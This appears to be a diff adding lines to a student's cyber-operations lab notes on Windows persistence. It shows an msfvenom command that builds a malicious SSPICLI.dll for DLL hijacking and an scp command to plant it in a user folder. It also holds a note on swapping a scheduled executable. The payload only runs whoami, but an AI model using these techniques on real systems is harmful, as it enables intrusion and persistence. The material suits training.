@@ -82,3 +82,13 @@ RENAME OLD EXEC TO RANDOM - RENAME THE NEW AS THE OLD THATS SCHEDUELD TO RUN
 WINDOWS LOGS, RIGHT CLICK, PROPERTIES.
 
 CREATE (CHANGE TIME SET)  ANY TIME --> CUSTOM RANGE, CHANGE TIME AND DATES TO MATCH WHAT YOURE LOOKING FOR
+
+
+
+
+student@lin-ops:~$ msfvenom -p windows/exec CMD='cmd.exe /C "whoami" > C:\Users\Student\Desktop\whoami.txt' -f dll > SSPICLI.dll
+
+student@lin-ops:~$ scp student@<linopsIP>:/home/student/SSPICLI.dll C:\Users\Student
+
+
+
